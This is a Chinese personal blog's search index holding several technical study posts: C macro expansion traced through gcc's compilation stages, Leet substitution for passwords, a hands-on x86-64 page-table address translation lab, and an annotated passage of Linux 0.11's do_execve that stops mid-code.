<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>C语言宏定义小试</title>
    <url>/embpgp.github.io/2016/09/06/C%E8%AF%AD%E8%A8%80%E5%AE%8F%E5%AE%9A%E4%B9%89%E5%B0%8F%E8%AF%95/</url>
    <content><![CDATA[<blockquote>
<p>今天方小白童鞋笔试了CVTE，遇到了很多Linux开发的问题，其实不乏有关于内核配置，boot启动分析相关试题等等，在这里主要分析一下C语言中宏定义的问题.主要侧重于实战了，具体的还是要根据标准来。我用的实验平台是ubuntu 16.04 i386。</p>
</blockquote>
<hr>
<h1 id="gcc编译过程分析"><a href="#gcc编译过程分析" class="headerlink" title="gcc编译过程分析"></a>gcc编译过程分析</h1><p><img src="/images/gcc_program.png" alt="gcc_program"></p>
<p>如上图所示，上图是在<strong>《程序员自我修养》</strong>这本书里面看到的，首先头文件和源文件在预处理阶段会融合在一起，生成.i文件。然后经过编译会生成.s文件，内容是汇编语言形式，之后经过汇编过程后变成.o的目标文件，这个文件其实已经成为了机器码了，但是缺乏加载地址以及函数符号问题未解决等，最后经过和库文件等进行链接生成可执行的二进制文件。在Linux下为elf格式，Windows下为PE格式。执行的时候将由各自的加载器对可执行文件中的代码和数据等进行解析并加载至内存中相应的属性页。当然如果直接一步<code>gcc sources -o target</code>是看不到这些过程的，gcc会一次性完成这些操作。下面我们就来实战一下吧。测试的源代码如下，有兴趣的还可以改用<code>++a</code>看看结果。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> F(x) ((x)*(x))</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> a = <span class="number">4</span>;</span><br><span class="line">	<span class="comment">//printf(&quot;%d\n&quot;, F(++a));</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, F(a++));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="预处理"><a href="#预处理" class="headerlink" title="预处理"></a>预处理</h1><p>首先我们看下图的源文件，其中就是涉及到了主要矛盾，<strong>宏定义</strong>。这个在C语言中用得相当多的一个技巧。在C++中会推荐使用<strong>const</strong>。具体缘由请自行搜索。像这种运算会产生问题的地方就是将变量填充为单目运算符的时候会发生问题。<br><img src="/images/compile.png" alt="compile"><br>接下来我们键入</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">gcc -E mocro_define.c -o mocro_define.i</span><br></pre></td></tr></table></figure>
<p><img src="/images/define_E.png" alt="define_E"><br>我们可以看到在生在.i文件之后，最后的几行代码被改变了，其中就是define被展开了。而且gcc在.i文件中插入了大量的外部引用和声明。总计有800多行。接下来我们看怎么编译。</p>
<h1 id="编译"><a href="#编译" class="headerlink" title="编译"></a>编译</h1><p>我们键入以下命令，其中的<code>-masm=intel</code>选项是让生成的汇编代码为intel格式的而非AT&amp;T格式的，个人还是习惯看intel格式的。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">gcc -S mocro_define.i -o mocro_define.s -masm=intel</span><br></pre></td></tr></table></figure>
<p><img src="/images/define_S.png" alt="define_S"><br>主要的部分如下图所示，其中很多.开头的都是一些符号，不必在意。程序段在开辟新的空间之后直接将4赋值给了<code>[ebp-12]</code>,即a。然后再将它的值送到<code>edx</code>寄存器，之后编译器利用<code>lea</code>指令优化使得<code>a++</code>执行，而后立即回送至内存中的a。之后又使得<code>a++</code>执行并回送至内存中。但是注意到，<code>imul</code>指令执行的时候仍然用的是<code>edx</code>和<code>eax</code>的值，即4*5,而<code>ecx</code>值虽然为6(最后的a)但是并不参与运算。最后直接将<code>eax</code>压栈<code>call printf</code>即可打印出来结果。在这里可以看出两个<code>a++</code>仅仅只有一个值是参与了乘法运算，详情可以参考优先级策略，可以深刻地理解编译器是如何处理这个类似<code>a++</code>运算符的。<br><img src="/images/define_S_main.png" alt="define_S_main"></p>
<h1 id="汇编"><a href="#汇编" class="headerlink" title="汇编"></a>汇编</h1><p>之后我们键入以下命令继续这个过程：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">gcc -c mocro_define.s -o mocro_define.o</span><br></pre></td></tr></table></figure>
<p><img src="/images/define_c.png" alt="define_c"><br>我们用readelf工具可以知道已经生成了与平台相关的目标代码了，这一步gcc内部封装的是as工具，当然我们也可以单独用as命令来执行汇编过程。特别是开发asm程序的时候可能会用到。接下来进行最后的链接过程。</p>
<h1 id="链接"><a href="#链接" class="headerlink" title="链接"></a>链接</h1><p>键入以下命令并执行可执行程序：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">gcc mocro_define.o -o mocro_define</span><br><span class="line">./mocro_define</span><br></pre></td></tr></table></figure>
<p><img src="/images/define_o.png" alt="define_o"><br>最后的结果就是汇编当中的代码分析过程。当然这一步也是gcc内部封装的ld工具，我们也可以手动执行，但是太麻烦，还要解决引入的库文件等问题。</p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>这篇文章主要还是从C程序的编译过程来逐步拆解分析。<strong>宏定义</strong>本身还是不严格的直接替换式地插入,对于类型检查不严格，对于表达式不计算，才会导致问题的发生。我们稍微调试一下明白了。建议还是从C语言的运算符优先级入手，分析这个过程可能容易很多，因为编译器也是遵照标准来实现的。</p>
]]></content>
      <categories>
        <category>study</category>
      </categories>
      <tags>
        <tag>C/C++</tag>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>Leet体验</title>
    <url>/embpgp.github.io/2017/03/18/Leet%E4%BD%93%E9%AA%8C/</url>
    <content><![CDATA[<blockquote>
<p>仅仅是装x用?</p>
</blockquote>
<span id="more"></span>

<hr>
<h1 id="密码强度"><a href="#密码强度" class="headerlink" title="密码强度"></a>密码强度</h1><p>目前互联网安全最严重的漏洞在于人，各大平台撞库的大多原因就是设置了简单而又相同的密码，还有某些管理员…。人们生活已经离不开密码了，如何设置密码有时候是个很头痛的问题，以至于出现了像1Password这样的企业。诚然，搜索一些前人的经验可以知道有很多种方法，比如<a href="https://www.zhihu.com/question/21201996">知乎这里</a>的讨论可以参考，建议有一套自己的”转换公式”。在想好了字符串之后再来进行一次”润色”。</p>
<h1 id="Leet"><a href="#Leet" class="headerlink" title="Leet"></a>Leet</h1><p>找到这个’Leet’源于今天在某论坛帖子中看到汇编代码中含有0xdeadbeef这样的字眼，觉得这种”Hexspeak”很有趣,还有好多Magic Number的故事呢…以下盗的一张维基百科的图就是主要的”润色”规则，其名曰:Leet，应该就是传说中的黑客俚语(详情请继续搜索引擎)。可以看到26个字母都能够被各种转换,经典的用法就是把阿拉伯数字转换成英文字母。比如1&lt;–&gt;i(l),2&lt;–&gt;Z,3&lt;–&gt;e,4&lt;–&gt;a,5&lt;–&gt;s($),6&lt;–&gt;b,7&lt;–&gt;t,8&lt;–&gt;B,9&lt;–&gt;g,0&lt;–&gt;O(个人常用)。这里主要的命名规则是从肉眼上很相像(所谓’形象字’)和读音(比如4&lt;–&gt;for,2&lt;–&gt;to等)，在输入到计算机里面的时候一般的情况下密码强度能够得到大大提高，当然，包括标点字符也是。在互联网上看到各种ID貌似很大成分参考了这部分，so，能猜到我的域名含义?<br><img src="/images/Leet_by_wikipedia.png" alt="Leet_by_wikipedia.png"></p>
<h1 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h1><p>要是管理员太渣密码强度再高也是于事无补…在信息泄露已经司空见惯的现在，多长点心二吧<del>_</del> :&gt;)</p>
]]></content>
      <categories>
        <category>misc</category>
      </categories>
      <tags>
        <tag>misc</tag>
        <tag>Sec</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux_Memory_Address_Mapping</title>
    <url>/embpgp.github.io/2017/10/14/Linux-Memory-Address-Mapping/</url>
    <content><![CDATA[<blockquote>
<p> 主要根据<a href="http://www.ilinuxkernel.com/">www.ilinuxkernel.com</a>站点上的同名pdf文档做实验分析</p>
</blockquote>
<span id="more"></span>

<hr>
<p>参考:<a href="https://jin-yang.github.io/post/kernel-memory-virtual-physical-map.html">https://jin-yang.github.io/post/kernel-memory-virtual-physical-map.html</a><br><a href="https://stackoverflow.com/questions/8516021/proc-create-example-for-kernel-module">https://stackoverflow.com/questions/8516021/proc-create-example-for-kernel-module</a><br><a href="http://www.voidcn.com/article/p-zqylmcig-ty.html">http://www.voidcn.com/article/p-zqylmcig-ty.html</a><br><a href="http://www.cnblogs.com/hoys/archive/2011/04/10/2011261.html">http://www.cnblogs.com/hoys/archive/2011/04/10/2011261.html</a></p>
<h1 id="体系架构"><a href="#体系架构" class="headerlink" title="体系架构"></a>体系架构</h1><p>首先要了解操作系统的内存管理机制,一般都是知道是段页式管理,但是各个处理器架构提供的机制有所不同,主要由处理器中mmu部件负责翻译,操作系统负责管理.特别在intel架构中,完全做到了段页式的实现.但是Linux内核在实现的时候是用技巧越过了段式的地址特性,即逻辑地址=线性地址,但是处理器对于地址转换的有效性的检查不会改变,只是说Linux内核实现比较巧妙.下面就开始实验.</p>
<h1 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h1><p>原文给我的实验代码是Linux 2.6内核的代码,我特意从网上下载了Centos6.9,之后<code>yum install kernel-devel.x86_64</code>安装发行版内核源代码,同时查看<code>build</code>目录是否正确链接到内核源码路径,可修改实验代码的Makefile文件的路径使其正确.当然,为了能够使得我PC的Linux 4.x内核也能够做这个实验,我对比了内核代码的改动部分,其中主要是<code>proc_create</code>接口变了,然后参考网上demo代码成功实现了迁移.可参考<a href="https://github.com/Iotlab-404/ilinuxkernel/tree/master/kernel/Memory_Address_Mapping">这里</a>.</p>
<h1 id="实验"><a href="#实验" class="headerlink" title="实验"></a>实验</h1><h2 id="mem-map"><a href="#mem-map" class="headerlink" title="mem_map"></a>mem_map</h2><p>编译好内核模块后insmod两个ko文件,因为我的测试环境为64位,因此修改mem_map.c的部分代码,运行如下:<br><img src="/images/ilk_mm_exam.png" alt="ilk_mm_exam.png"></p>
<h2 id="fileview"><a href="#fileview" class="headerlink" title="fileview"></a>fileview</h2><p>这个工具跟内核模块dram.ko挂钩,通过实现了lseek和read文件操作方法来对应用层开放查询进程物理地址信息.具体操作可见代码,其中主要可以按照显示方式为8421字节感觉很有用,若需要输入指定物理地址,按回车即可.</p>
<h2 id="开始计算"><a href="#开始计算" class="headerlink" title="开始计算"></a>开始计算</h2><h3 id="查看gdt中ds描述符"><a href="#查看gdt中ds描述符" class="headerlink" title="查看gdt中ds描述符"></a>查看gdt中ds描述符</h3><p>按照pdf教程,tmp所在段在ds数据段,查看后发现确实段基址为0.<br> <img src="/images/ilk_mm_gdtr.png" alt="ilk_mm_gdtr.png"></p>
<h3 id="分解tmp地址为二进制"><a href="#分解tmp地址为二进制" class="headerlink" title="分解tmp地址为二进制"></a>分解tmp地址为二进制</h3><p>计算偏移的工具bc,我将其封装了一下,命名为calc.sh,代码在<a href="https://github.com/embpgp/PersonalToolKits/blob/master/shell/calc.sh">这里</a>.tmp地址分解如下:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@Rutk1t0r:Memory_Address_Mapping<span class="comment"># calc.sh -i 16 -o 2 7FFD0A1330C8</span></span><br><span class="line">11111111111110100001010000100110011000011001000</span><br><span class="line">root@Rutk1t0r:Memory_Address_Mapping<span class="comment"># </span></span><br></pre></td></tr></table></figure>
<p>应该为分成9 9 9 9 12.<br>011111111 111110100 001010000 100110011 000011001000</p>
<h3 id="CR3-gt-一级"><a href="#CR3-gt-一级" class="headerlink" title="CR3-&gt;一级"></a>CR3-&gt;一级</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@Rutk1t0r:Memory_Address_Mapping<span class="comment"># calc.sh -i 2 -o 16 8*11111111</span></span><br><span class="line">7F8</span><br><span class="line">root@Rutk1t0r:Memory_Address_Mapping<span class="comment"># </span></span><br></pre></td></tr></table></figure>
<p>CR3=36082000,一级=36082000+8*011111111b=360827F8<br><img src="/images/ilk_mm_cr3-one.png" alt="ilk_mm_cr3-one.png"></p>
<h3 id="一级-gt-二级"><a href="#一级-gt-二级" class="headerlink" title="一级-&gt;二级"></a>一级-&gt;二级</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@Rutk1t0r:Memory_Address_Mapping<span class="comment"># calc.sh -i 2 -o 16 8*111110100</span></span><br><span class="line">FA0</span><br><span class="line">root@Rutk1t0r:Memory_Address_Mapping<span class="comment"># </span></span><br><span class="line">````</span><br><span class="line">一级=391B8000,二级=391B8000+8*111110100=391B8FA0</span><br><span class="line">![ilk_mm_one-two.png](/images/ilk_mm_one-two.png)</span><br><span class="line"><span class="comment">### 二级-&gt;三级</span></span><br><span class="line">二级=3D817000,三级=3D817000+8*001010000=3D817280</span><br><span class="line">```bash</span><br><span class="line">root@Rutk1t0r:rutk1t0r<span class="comment"># calc.sh -i 2 -o 16 8*001010000</span></span><br><span class="line">280</span><br><span class="line">root@Rutk1t0r:rutk1t0r<span class="comment">#</span></span><br></pre></td></tr></table></figure>
<p><img src="/images/ilk_mm_two-three.png" alt="ilk_mm_two-three.png"></p>
<h3 id="三级-gt-四级"><a href="#三级-gt-四级" class="headerlink" title="三级-&gt;四级"></a>三级-&gt;四级</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@Rutk1t0r:Memory_Address_Mapping<span class="comment"># calc.sh -i 2 -o 16 8*100110011</span></span><br><span class="line">998</span><br><span class="line">root@Rutk1t0r:Memory_Address_Mapping<span class="comment">#</span></span><br></pre></td></tr></table></figure>
<p>三级=3B04B000,四级=3B04B000+8*100110011=3B04B998<br><img src="/images/ilk_mm_three-four.png" alt="ilk_mm_three-four.png"></p>
<h3 id="四级-gt-真实物理地址-值"><a href="#四级-gt-真实物理地址-值" class="headerlink" title="四级-&gt;真实物理地址(值)"></a>四级-&gt;真实物理地址(值)</h3><p>四级=27D0F000,phy_addr=27D0F000+0c8=27D0F0C8.<br><img src="/images/ilk_mm_four-phy.png" alt="ilk_mm_four-phy.png"><br> 而mem_map.c代码如下:<br> <figure class="highlight c"><table><tr><td class="code"><pre><span class="line"> [root@localhost mm_addr]<span class="meta"># cat mem_map.c </span></span><br><span class="line"> <span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"> <span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"> <span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"> <span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"> <span class="meta">#<span class="meta-keyword">define</span> REGISTERINFO <span class="meta-string">&quot;/proc/sys_reg&quot;</span></span></span><br><span class="line"> <span class="meta">#<span class="meta-keyword">define</span> BUFSIZE  4096</span></span><br><span class="line"></span><br><span class="line"> <span class="keyword">static</span> <span class="keyword">char</span> buf[BUFSIZE];</span><br><span class="line"> <span class="keyword">static</span> <span class="keyword">unsigned</span> <span class="keyword">long</span> addr;</span><br><span class="line"></span><br><span class="line"> <span class="meta">#<span class="meta-keyword">define</span> FILE_TO_BUF(filename, fd) do&#123;	\</span></span><br><span class="line"><span class="meta">	static int local_n;	\</span></span><br><span class="line"><span class="meta">	<span class="meta-keyword">if</span> (fd == - 1 &amp;&amp; (fd = open(filename, O_RDONLY)) == - 1) &#123;	\</span></span><br><span class="line"><span class="meta">	fprintf(stderr, <span class="meta-string">&quot;Open /proc/register file failed! \n&quot;</span>);	\</span></span><br><span class="line"><span class="meta">	fflush(NULL);	\</span></span><br><span class="line"><span class="meta">	_exit(102);	\</span></span><br><span class="line"><span class="meta">	&#125;	\</span></span><br><span class="line"><span class="meta">	lseek(fd, 0L, SEEK_SET);	\</span></span><br><span class="line"><span class="meta">	<span class="meta-keyword">if</span> ((local_n = read(fd, buf , sizeof buf -  1)) &lt; 0) &#123;	\</span></span><br><span class="line"><span class="meta">	perror(filename);	\</span></span><br><span class="line"><span class="meta">	fflush(NULL);	\</span></span><br><span class="line"><span class="meta">	_exit(103);	\</span></span><br><span class="line"><span class="meta">	&#125;	\</span></span><br><span class="line"><span class="meta">	buf [local_n] = 0;	\</span></span><br><span class="line"><span class="meta"> &#125;while(0)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> <span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"> </span>&#123;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> tmp;</span><br><span class="line">	tmp = <span class="number">0x12345678deadbeef</span>;</span><br><span class="line">	<span class="keyword">static</span> <span class="keyword">int</span> cr_fd = - <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">asm</span>(<span class="string">&quot;movq %rbp, %rbx\n movq %rbx, addr&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;\n%%rbp:0x%08lX\n&quot;</span>, addr);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;tmp address:0x%08lX\n&quot;</span>, &amp;tmp);</span><br><span class="line">	FILE_TO_BUF(REGISTERINFO, cr_fd);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, buf );</span><br><span class="line"></span><br><span class="line">	<span class="keyword">while</span>(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line">[root@localhost mm_addr]# </span><br><span class="line"></span><br></pre></td></tr></table></figure><br>成功通过段页式翻译找到tmp对应的值为0x12345678deadbeef.</p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>通过实验加深理解,如有时间可再深入研究物理地址映射的实现.</p>
]]></content>
      <categories>
        <category>study</category>
      </categories>
      <tags>
        <tag>Linux kernel</tag>
        <tag>LDD</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux内核0.11完全注释 0.11的loader-&gt;execve</title>
    <url>/embpgp.github.io/2016/12/30/Linux%E5%86%85%E6%A0%B80-11%E5%AE%8C%E5%85%A8%E6%B3%A8%E9%87%8A-0-11%E7%9A%84loader-execve/</url>
    <content><![CDATA[<blockquote>
<p>着重分析操作系统的加载器是如何运行程序的。</p>
</blockquote>
<span id="more"></span>

<hr>
<h1 id="从fork到execve"><a href="#从fork到execve" class="headerlink" title="从fork到execve"></a>从fork到execve</h1><p>根据Linux操作系统的设计原理,在Linux 0.11版本里面，进程0是手动创建的，进程1(init)是fork到进程0的，并且后续进程都是以1号进程为最顶层父进程。如果仅仅是fork只能实现所谓的多进程并发操作，而想要加载新的内容的话必须使用execve系统调用，将数据和代码从其他介质(比如硬盘)通过文件系统加载到内存，将原有进程代码和数据”冲刷掉”，现代Linux操作系统大体上也是这样的。</p>
<h1 id="do-execve"><a href="#do-execve" class="headerlink" title="do_execve()"></a>do_execve()</h1><ul>
<li><p>根据Linux操作系统内核的编码习惯*do_*开头的一般为系统调用或者中断的下半部函数。在后续的Linux内核版本里面允许进程在内核态被抢占(几乎总是在中断里面)就主要是执行下半部的时候开放中断。个人认为所谓被抢占即不是自愿放弃CPU时间(即任务自身进程空间内主动直接或者间接调用schedule函数进行任务调度和切换),而主要是由于时钟中断(所谓操作系统的脉搏)而引发的周期性的任务调度。但是在0.11版本里面当发生时钟中断的时候会检查当前的cs是否为0x0f(0.11代码段选择子写死)，如果不是的话表明刚刚从另外一个任务的内核态切换过来的，控制流程立即返回，而不进行调度。</p>
</li>
<li><p>在反汇编的时候会经常发现C库的crt过程先push三个参数，然后call main,最后再返回。<br><img src="/images/Linux_0.11_fs_exec_new_stack.png" alt="Linux_0.11_fs_exec_new_stack.png"></p>
</li>
<li><p>用户层执行exec类lib函数库簇或者直接通过系统调用嵌入汇编等方式触发系统调用,因此至少传递filename、argv、envp等参数，貌似envp经常由编译链接过程自动填充。</p>
</li>
<li><p>函数首先检查是否为用户层通过系统调用过来的，如果不是则panic。</p>
</li>
<li><p>linus认为128K的空间足够来存储环境变量和参数,因此立即先将这段空间初始化为0</p>
</li>
<li><p>可执行文件必须为普通文件</p>
</li>
<li><p>根据文件的set标志位等检查进程是否有权限执行该文件</p>
</li>
<li><p>先处理是否为脚本类可执行文件，因此直接读出文件的第一块内容，看第一行是否为<code>#!</code>,该约定在内核里面写死，因此如果不是则不能执行脚本。</p>
</li>
<li><p>如果是脚本的话将改造参数顺序，如原来为<code>./example.sh -arg1 -arg2</code>变为<code>interp -iarg1 -iarg2 example.sh -arg1 -arg2</code>，即把可执行文件送往解释脚本里面去(注意没有约定说一定要为#!/bin/sh,例如#!/bin/cat等自己可以试试)，而解释脚本(如bash)本身为elf格式的二进制可执行文件，可被直接加载到内存交由CPU执行，有种”偷天换日”的感觉，但事实就是这样，而解释脚本(一般为bash)进一步怎么处理那是它的事情，可参考GNU的各种/bin/目录下文件的实现(例如GNU bash)。</p>
</li>
<li><p>之后便将参数一一填充至顶端,并取得解释程序i节点继续goto处理，第二次的处理将在这个if语句<code>if ((bh-&gt;b_data[0] == &#39;#&#39;) &amp;&amp; (bh-&gt;b_data[1] == &#39;!&#39;) &amp;&amp; (!sh_bang)) &#123;</code>跳出到brelse(bh)。</p>
</li>
<li><p>然后便直接开始二进制程序的识别了,0.11版本的仅仅支持ZMAGIC格式的可执行映像。下图为0.11系统中hello程序的磁盘映像布局。(精通处理器指令集的大牛可以尝试不需要编译器链接器手动创建一个程序…)<br><img src="/images/Linux_0.11_fs_exec_ZMAGIC_header.png" alt="Linux_0.11_fs_exec_ZMAGIC_header.png"></p>
</li>
<li><p>处理掉原来进程的一些”后事”之后便修改task_struct结构的某些字段，置返回地址为新程序的入口，栈指针为环境块、参数块p,如果调度程序待会儿调度到本进程运行，则立即触发no_page异常，页面处理程序将磁盘上的代码和数据载入相应线性地址映射的物理地址处即可按需加载执行。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * &#x27;do_execve()&#x27; executes a new program.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="comment">//// execve()系统中断调用函数。加载并执行子进程</span></span><br><span class="line"><span class="comment">// 该函数是系统中断调用（int 0x80）功能号__NR_execve调用的函数。函数的参数是进</span></span><br><span class="line"><span class="comment">// 入系统调用处理过程后直接到调用本系统调用处理过程和调用本函数之前逐步压入栈中</span></span><br><span class="line"><span class="comment">// 的值。</span></span><br><span class="line"><span class="comment">// eip - 调用系统中断的程序代码指针。</span></span><br><span class="line"><span class="comment">// tmp - 系统中断中在调用_sys_execve时的返回地址，无用；</span></span><br><span class="line"><span class="comment">// filename - 被执行程序文件名指针；</span></span><br><span class="line"><span class="comment">// argv - 命令行参数指针数组的指针；</span></span><br><span class="line"><span class="comment">// envp - 环境变量指针数组的指针。</span></span><br><span class="line"><span class="comment">// 返回：如果调用成功，则不返回；否则设置出错号，并返回-1.</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">do_execve</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">long</span> * eip,<span class="keyword">long</span> tmp,<span class="keyword">char</span> * filename,</span></span></span><br><span class="line"><span class="params"><span class="function">	<span class="keyword">char</span> ** argv, <span class="keyword">char</span> ** envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">m_inode</span> * <span class="title">inode</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">buffer_head</span> * <span class="title">bh</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">exec</span> <span class="title">ex</span>;</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> page[MAX_ARG_PAGES];</span><br><span class="line">	<span class="keyword">int</span> i,argc,envc;</span><br><span class="line">	<span class="keyword">int</span> e_uid, e_gid;</span><br><span class="line">	<span class="keyword">int</span> retval;</span><br><span class="line">	<span class="keyword">int</span> sh_bang = <span class="number">0</span>;                            <span class="comment">// 控制是否需要执行的脚本程序</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> p=PAGE_SIZE*MAX_ARG_PAGES<span class="number">-4</span>;  <span class="comment">// p指向参数和环境空间的最后部</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 在正式设置执行文件的运行环境之前，让我们先干这些杂事。内核准备了128kb(32</span></span><br><span class="line">    <span class="comment">// 个页面)空间来存放化执行文件的命令行参数和环境字符串。上杭把p初始设置成位</span></span><br><span class="line">    <span class="comment">// 于128KB空间中的当前位置。</span></span><br><span class="line">    <span class="comment">// 另外，参数eip[1]是调用本次系统调用的原用户程序代码段寄存器CS值，其中的段</span></span><br><span class="line">    <span class="comment">// 选择符当然必须是当前任务的代码段选择符0x000f.若不是该值，那么CS只能会是</span></span><br><span class="line">    <span class="comment">// 内核代码段的选择符0x0008.但这是绝对不允许的，因为内核代码是常驻内存而不</span></span><br><span class="line">    <span class="comment">// 能被替换掉的。因此下面根据eip[1]的值确认是否符合正常情况。然后再初始化</span></span><br><span class="line">    <span class="comment">// 128KB的参数和环境串空间，把所有字节清零，并取出执行文件的i节点。再根据函</span></span><br><span class="line">    <span class="comment">// 数参数分别计算出命令行参数和环境字符串的个数argc和envc。另外，执行文件必</span></span><br><span class="line">    <span class="comment">// 须是常规文件。</span></span><br><span class="line">	<span class="keyword">if</span> ((<span class="number">0xffff</span> &amp; eip[<span class="number">1</span>]) != <span class="number">0x000f</span>)</span><br><span class="line">		panic(<span class="string">&quot;execve called from supervisor mode&quot;</span>);</span><br><span class="line">	<span class="keyword">for</span> (i=<span class="number">0</span> ; i&lt;MAX_ARG_PAGES ; i++)	<span class="comment">/* clear page-table */</span></span><br><span class="line">		page[i]=<span class="number">0</span>;</span><br><span class="line">	<span class="keyword">if</span> (!(inode=namei(filename)))		<span class="comment">/* get executables inode */</span></span><br><span class="line">		<span class="keyword">return</span> -ENOENT;</span><br><span class="line">	argc = count(argv);</span><br><span class="line">	envc = count(envp);</span><br><span class="line">	</span><br><span class="line">restart_interp:</span><br><span class="line">	<span class="keyword">if</span> (!S_ISREG(inode-&gt;i_mode)) &#123;	<span class="comment">/* must be regular file */</span></span><br><span class="line">		retval = -EACCES;</span><br><span class="line">		<span class="keyword">goto</span> exec_error2;</span><br><span class="line">	&#125;</span><br><span class="line">    <span class="comment">// 下面检查当前进程是否有权运行指定的执行文件。即根据执行文件i节点中的属性，</span></span><br><span class="line">    <span class="comment">// 看看本进程是否有权执行它。在把执行文件i节点的属性字段值取到i中后，我们首</span></span><br><span class="line">    <span class="comment">// 先查看属性中是否设置了&quot;设置-用户-ID&quot;(set-user_id)标志和“设置-组-ID”(set_group-id)</span></span><br><span class="line">    <span class="comment">// 标志。这两个标志主要是让一般用户能够执行特权用户(如超级用户root)的程序，</span></span><br><span class="line">    <span class="comment">// 例如改变密码的程序passwd等。如果set-user-id标志置位，则后面执行进程的有</span></span><br><span class="line">    <span class="comment">// 效用户ID(euid)就设置成执行文件的用户ID，否则设置成当前进程的euid。如果执</span></span><br><span class="line">    <span class="comment">// 行文件set-group-id被置位的话，则执行进程的有效组ID（egid）就被设置为执行</span></span><br><span class="line">    <span class="comment">// 文件的组ID。否则设置成当前进程的egid。这里暂时把这两个判断出来的值保存在</span></span><br><span class="line">    <span class="comment">// 变量e_uid和e_gid中。</span></span><br><span class="line">	i = inode-&gt;i_mode;                      <span class="comment">// 取文件属性字段</span></span><br><span class="line">	e_uid = (i &amp; S_ISUID) ? inode-&gt;i_uid : current-&gt;euid;</span><br><span class="line">	e_gid = (i &amp; S_ISGID) ? inode-&gt;i_gid : current-&gt;egid;</span><br><span class="line">    <span class="comment">// 现在根据进程的euid和egid和执行文件的访问属性进行比较。如果执行文件属于运</span></span><br><span class="line">    <span class="comment">// 行进程的用户，则把文件属性值i右移6位，此时最低3位是文件宿主的访问权限标</span></span><br><span class="line">    <span class="comment">// 志。否则的话如果执行文件与当前进程的用户属性同租，则使属性值最低3位是执</span></span><br><span class="line">    <span class="comment">// 行文件组用户的访问权限标志。否则此时属性值最低3位就是其他用户访问该执行</span></span><br><span class="line">    <span class="comment">// 文件的权限。</span></span><br><span class="line">    <span class="comment">// 然后我们根据属性字i的最低3bit值来判断当前进程是否有权限运行这个执行文件。</span></span><br><span class="line">    <span class="comment">// 如果选出的相应用户没有运行该文件的权利(位0是执行权限)，并且其他用户也没</span></span><br><span class="line">    <span class="comment">// 有任何权限或者当前进程用户不是超级用户，则表明当前进程没有权利运行这个执</span></span><br><span class="line">    <span class="comment">// 行文件。于是置不可执行出错码，并跳转到exec_error2处去做退出处理。</span></span><br><span class="line">	<span class="keyword">if</span> (current-&gt;euid == inode-&gt;i_uid)</span><br><span class="line">		i &gt;&gt;= <span class="number">6</span>;</span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">if</span> (current-&gt;egid == inode-&gt;i_gid)</span><br><span class="line">		i &gt;&gt;= <span class="number">3</span>;</span><br><span class="line">	<span class="keyword">if</span> (!(i &amp; <span class="number">1</span>) &amp;&amp;</span><br><span class="line">	    !((inode-&gt;i_mode &amp; <span class="number">0111</span>) &amp;&amp; suser())) &#123;</span><br><span class="line">		retval = -ENOEXEC;</span><br><span class="line">		<span class="keyword">goto</span> 